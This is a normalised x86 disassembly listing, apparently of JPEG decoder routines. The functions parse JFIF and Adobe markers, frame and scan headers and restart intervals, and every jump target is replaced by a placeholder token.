jmp r-xdata
sub_4628f0
push ebp
mov ebp esp
push esi
mov esi [ eax + 0x136 ]
mov eax [ edx + 0x50 ]
movsx edx [ ecx ]
imul edx [ eax ]
mov eax edx
add esi 0x80
add eax 0x4
mov ecx [ ebp + 0xc ]
sar eax 0x3
and eax 0x3ff
mov dl [ esi + eax ]
mov eax [ ecx ]
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] dl
pop esi
pop ebp
retn 0x8
sub_46292c
push ebx
mov ebx eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x65
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov edx [ ebx + 0x1aa ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
xor edx edx
lea eax [ ebx + 0xe0 ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x3c
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ eax ] 0x0
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x20 ] 0x5
inc edx
inc eax
cmp edx 0x10
jl r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x110 ] ecx
mov [ ebx + 0x24 ] eax
xor edx edx
xor ecx ecx
mov [ ebx + 0x122 ] edx
mov [ ebx + 0x114 ] ecx
mov [ ebx + 0x118 ] 0x0
mov [ ebx + 0x119 ] 0x1
mov [ ebx + 0x11b ] 0x1
xor eax eax
mov [ ebx + 0x11d ] eax
mov eax 0x1
mov [ ebx + 0x121 ] 0x0
mov edx [ ebx + 0x1aa ]
mov [ edx + 0x50 ] 0x1
pop ebx
retn
sub_4629d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov eax [ ebx + 0x14 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
mov eax [ esp ]
test edi edi
mov [ ebx + 0xd8 ] eax
mov edx [ esp + 0x4 ]
mov [ ebx + 0xdc ] edx
jne r-xdata
dec edi
movzx ebp [ esi ]
shl ebp 0x8
inc esi
test edi edi
jne r-xdata
mov ecx [ esp + 0xc ]
mov eax ebx
call [ ecx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
add ebp eax
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ ebx + 0xd0 ] eax
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ ebx + 0x1c ] eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ ebx + 0x1c ] eax
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ ebx + 0x18 ] eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ ebx + 0x18 ] eax
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
sub ebp 0x8
mov [ ebx + 0x20 ] eax
mov eax [ ebx ]
add eax 0x18
mov edx [ ebx + 0x192 ]
mov [ eax ] edx
mov ecx [ ebx + 0x18 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx + 0x1c ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x20 ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x63
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x1aa ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
jbe r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x39
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x1f
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x18 ] 0x0
jbe r-xdata
cmp [ ebx + 0xd4 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x9
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x20 ] 0x0
jg r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ ebx + 0xd4 ]
jmp r-xdata
mov ecx [ ebx + 0x20 ]
mov edx 0x1
mov eax ecx
lea ecx [ eax + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax ebx
shl ecx 0x2
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + 0xd4 ] eax
mov ecx [ ebx + 0x20 ]
lea ecx [ ecx + ecx * 2 ]
cmp ebp ecx
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax [ esp + 0x8 ]
test edi edi
mov [ ebp + 0x4 ] eax
jne r-xdata
mov edx [ ebx + 0x1aa ]
mov [ edx + 0x54 ] 0x1
mov ecx [ esp + 0xc ]
mov [ ecx ] esi
mov eax [ esp + 0xc ]
mov [ eax + 0x4 ] edi
mov eax 0x1
dec edi
xor eax eax
mov al [ esi ]
mov [ ebp ] eax
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
mov edx eax
and eax 0xf
sar edx 0x4
and edx 0xf
test edi edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add eax 0x18
mov edx [ ebp ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x64
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
inc [ esp + 0x8 ]
add ebp 0x54
mov ecx [ esp + 0xc ]
mov eax ebx
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
sub_462d54
push ebx
push esi
push edi
push ebp
mov ebx eax
add esp 0xffffffe8
mov eax [ ebx + 0x14 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov eax [ ebx + 0x1aa ]
mov edi [ edx ]
cmp [ eax + 0x54 ] 0x0
jne r-xdata
test ebp ebp
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x3d
mov edx [ eax ]
call [ edx ]
dec ebp
movzx esi [ edi ]
shl esi 0x8
inc edi
test ebp ebp
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax ebx
call [ ecx + 0xc ]
test eax eax
jne r-xdata
dec ebp
xor eax eax
mov al [ edi ]
add esi eax
inc edi
test ebp ebp
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
dec ebp
xor eax eax
mov al [ edi ]
mov [ esp + 0x4 ] eax
inc edi
mov edx [ esp + 0x4 ]
add edx edx
add edx 0x6
cmp esi edx
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0x1
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
cmp [ esp + 0x4 ] 0x4
jle r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
test ebp ebp
mov edx [ esp + 0x8 ]
mov [ ebx + 0x182 ] edx
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
dec ebp
xor eax eax
mov al [ edi ]
mov [ esp + 0xc ] eax
inc edi
test ebp ebp
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x66
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ ebx + 0x13a ] eax
xor edx edx
mov [ esp ] edx
lea ecx [ ebx + 0x13e ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jge r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
test ebp ebp
mov edx [ esp + 0x8 ]
mov [ ebx + 0x186 ] edx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax ebx
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
xor eax eax
mov esi [ ebx + 0xd4 ]
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
dec ebp
xor eax eax
mov al [ edi ]
mov [ esp + 0x8 ] eax
inc edi
mov edx [ esp + 0x8 ]
sar edx 0x4
and edx 0xf
mov [ ebx + 0x18a ] edx
mov ecx [ esp + 0x8 ]
and ecx 0xf
mov [ ebx + 0x18e ] ecx
mov eax [ ebx ]
add eax 0x18
mov edx [ ebx + 0x182 ]
mov [ eax ] edx
mov ecx [ ebx + 0x186 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx + 0x18a ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x18e ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x68
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x1aa ]
xor edx edx
mov [ eax + 0x58 ] edx
inc [ ebx + 0x8c ]
mov ecx [ esp + 0x10 ]
mov [ ecx ] edi
mov eax [ esp + 0x10 ]
mov [ eax + 0x4 ] ebp
mov eax 0x1
mov ecx [ esp + 0x10 ]
mov eax ebx
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0xc ]
cmp edx [ esi ]
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x5
mov ecx [ esp + 0xc ]
mov [ eax + 0x18 ] ecx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] esi
mov eax [ esp + 0x8 ]
sar eax 0x4
and eax 0xf
mov [ esi + 0x14 ] eax
mov edx [ esp + 0x8 ]
and edx 0xf
mov [ esi + 0x18 ] edx
mov eax [ ebx ]
add eax 0x18
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x18 ]
mov [ eax + 0x8 ] edx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x67
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
inc [ esp ]
add [ esp + 0x14 ] 0x4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jl r-xdata
inc eax
add esi 0x54
sub_463094
push ebx
mov ebx eax
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp [ ebx + 0x14 ]
mov edi [ ebp + 0x4 ]
mov esi [ ebp ]
test edi edi
jne r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ esp ] eax
jne r-xdata
mov eax ebx
call [ ebp + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ esp ] eax
inc esi
sub [ esp ] 0x2
cmp [ esp ] 0xe
jl r-xdata
mov eax ebx
call [ ebp + 0xc ]
test eax eax
jne r-xdata
mov esi [ ebp ]
mov edi [ ebp + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4c
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor edx edx
lea ecx [ esp + 0xc ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] ecx
mov esi [ ebp ]
mov edi [ ebp + 0x4 ]
xor eax eax
jmp r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x1
mov edx [ esp ]
mov eax ebx
mov ecx [ eax + 0x14 ]
call [ ecx + 0x10 ]
dec edi
mov eax [ esp + 0x8 ]
mov dl [ esi ]
mov [ eax ] dl
inc esi
inc [ esp + 0x4 ]
inc [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0xe
jl r-xdata
mov eax ebx
call [ ebp + 0xc ]
test eax eax
jne r-xdata
test edi edi
jne r-xdata
sub [ esp ] 0xe
cmp [ esp + 0xc ] 0x4a
jne r-xdata
mov esi [ ebp ]
mov edi [ ebp + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4c
mov edx [ esp ]
add edx 0xe
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
cmp [ esp + 0xd ] 0x46
jne r-xdata
mov [ ebp ] esi
mov [ ebp + 0x4 ] edi
cmp [ esp ] 0x0
jle r-xdata
cmp [ esp + 0xe ] 0x49
jne r-xdata
cmp [ esp + 0xf ] 0x46
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x11 ] 0x1
je r-xdata
cmp [ esp + 0x12 ] 0x2
jbe r-xdata
mov eax [ ebx ]
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] 0x73
mov dl [ esp + 0x11 ]
mov [ eax + 0x18 ] edx
or edx 0xffffffff
mov cl [ esp + 0x12 ]
mov [ eax + 0x1c ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
mov [ ebx + 0x114 ] 0x1
mov al [ esp + 0x13 ]
xor edx edx
mov [ ebx + 0x118 ] al
xor ecx ecx
mov dl [ esp + 0x14 ]
mov cl [ esp + 0x15 ]
shl edx 0x8
xor eax eax
add dx cx
mov [ ebx + 0x119 ] dx
xor edx edx
mov al [ esp + 0x16 ]
mov dl [ esp + 0x17 ]
shl eax 0x8
add ax dx
mov [ ebx + 0x11b ] ax
mov eax [ ebx ]
add eax 0x18
movzx edx [ ebx + 0x119 ]
mov [ eax ] edx
movzx ecx [ ebx + 0x11b ]
mov [ eax + 0x4 ] ecx
xor edx edx
mov dl [ ebx + 0x118 ]
mov [ eax + 0x8 ] edx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x56
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov al [ esp + 0x18 ]
or al [ esp + 0x19 ]
je r-xdata
mov eax [ ebx ]
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] 0x58
mov dl [ esp + 0x11 ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov cl [ esp + 0x12 ]
mov [ eax + 0x1c ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
xor edx edx
mov dl [ esp + 0x19 ]
mov al [ esp + 0x18 ]
imul edx
lea ecx [ eax + eax * 2 ]
cmp ecx [ esp ]
je r-xdata
mov eax [ ebx ]
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] 0x59
mov dl [ esp + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov cl [ esp + 0x19 ]
mov [ eax + 0x1c ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x57
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
sub_463318
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebp eax
mov edi [ ebp + 0x14 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp ] eax
jne r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp ] eax
inc ebx
sub [ esp ] 0x2
cmp [ esp ] 0xc
jl r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x4d
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor edx edx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] ecx
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax 0x1
mov edx [ esp ]
mov eax ebp
mov ecx [ eax + 0x14 ]
call [ ecx + 0x10 ]
dec esi
mov eax [ esp + 0x18 ]
mov dl [ ebx ]
mov [ eax ] dl
inc ebx
inc [ esp + 0x4 ]
inc [ esp + 0x18 ]
cmp [ esp + 0x4 ] 0xc
jl r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
sub [ esp ] 0xc
cmp [ esp + 0x1c ] 0x41
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x4d
mov edx [ esp ]
add edx 0xc
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
cmp [ esp + 0x1d ] 0x64
jne r-xdata
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
cmp [ esp ] 0x0
jle r-xdata
cmp [ esp + 0x1e ] 0x6f
jne r-xdata
cmp [ esp + 0x1f ] 0x62
jne r-xdata
cmp [ esp + 0x20 ] 0x65
jne r-xdata
xor ecx ecx
xor eax eax
mov cl [ esp + 0x21 ]
mov al [ esp + 0x22 ]
shl ecx 0x8
xor edx edx
add ecx eax
xor eax eax
mov [ esp + 0x8 ] ecx
xor ecx ecx
mov dl [ esp + 0x23 ]
mov cl [ esp + 0x24 ]
shl edx 0x8
add edx ecx
mov [ esp + 0xc ] edx
xor edx edx
mov al [ esp + 0x25 ]
mov dl [ esp + 0x26 ]
shl eax 0x8
add eax edx
xor ecx ecx
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x27 ]
mov [ esp + 0x14 ] ecx
mov eax [ ebp ]
add eax 0x18
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x10 ]
mov [ eax + 0x8 ] edx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x4b
mov edx 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebp + 0x11d ] 0x1
mov al [ esp + 0x14 ]
mov [ ebp + 0x121 ] al
jmp r-xdata
sub_4634f0
push ebx
push esi
push edi
push ebp
mov ebx eax
add esp 0xfffffff4
mov eax [ ebx + 0x14 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
test ebp ebp
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
shl eax 0x8
test ebp ebp
mov [ esp ] eax
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
dec ebp
xor eax eax
mov al [ edi ]
add [ esp ] eax
inc edi
sub [ esp ] 0x2
cmp [ esp ] 0x0
jle r-xdata
mov edx [ esp + 0x8 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov [ ecx ] edi
mov eax [ esp + 0x8 ]
mov [ eax + 0x4 ] ebp
mov eax 0x1
test ebp ebp
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
movzx esi [ edi ]
inc edi
dec ebp
test ebp ebp
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x4 ] eax
sub [ esp ] 0x2
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4e
mov [ eax + 0x18 ] esi
mov edx [ esp + 0x4 ]
mov [ eax + 0x1c ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
test esi esi
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x20
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov al [ esp + 0x4 ]
and al 0xf
mov [ ebx + esi + 0xe0 ] al
mov eax [ esp + 0x4 ]
sar eax 0x4
mov [ ebx + esi + 0xf0 ] al
cmp al [ ebx + esi + 0xe0 ]
jae r-xdata
mov cl [ esp + 0x4 ]
mov [ ebx + esi + 0xf0 ] cl
jmp r-xdata
cmp esi 0x10
jl r-xdata
cmp [ esp ] 0x0
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1b
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_463684
push ebx
push esi
push edi
push ebp
mov edi eax
add esp 0xfffffed4
mov eax [ edi + 0x14 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp ] eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp ] eax
inc ebx
sub [ esp ] 0x2
cmp [ esp ] 0x0
jle r-xdata
mov edx [ esp + 0xc ]
mov eax edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ ecx ] ebx
mov eax [ esp + 0xc ]
mov [ eax + 0x4 ] esi
mov eax 0x1
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
add esp 0x12c
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
mov [ esp + 0x4 ] eax
mov eax [ edi ]
mov [ eax + 0x14 ] 0x4f
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ esp + 0x18 ] 0x0
xor eax eax
mov ebp 0x1
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x19 ]
mov [ esp + 0x10 ] eax
mov edx [ esp + 0xc ]
mov eax edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov al [ ebx ]
xor ecx ecx
inc ebx
mov cl al
mov [ edx ] al
add [ esp + 0x8 ] ecx
inc [ esp + 0x10 ]
dec esi
inc ebp
cmp ebp 0x10
jle r-xdata
mov edx [ esp + 0xc ]
mov eax edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
sub [ esp ] 0x11
mov eax [ edi ]
add eax 0x18
xor edx edx
mov dl [ esp + 0x19 ]
mov [ eax ] edx
xor ecx ecx
mov cl [ esp + 0x1a ]
mov [ eax + 0x4 ] ecx
xor edx edx
mov dl [ esp + 0x1b ]
mov [ eax + 0x8 ] edx
xor ecx ecx
mov cl [ esp + 0x1c ]
mov [ eax + 0xc ] ecx
xor edx edx
mov dl [ esp + 0x1d ]
mov [ eax + 0x10 ] edx
xor ecx ecx
mov cl [ esp + 0x1e ]
mov [ eax + 0x14 ] ecx
xor edx edx
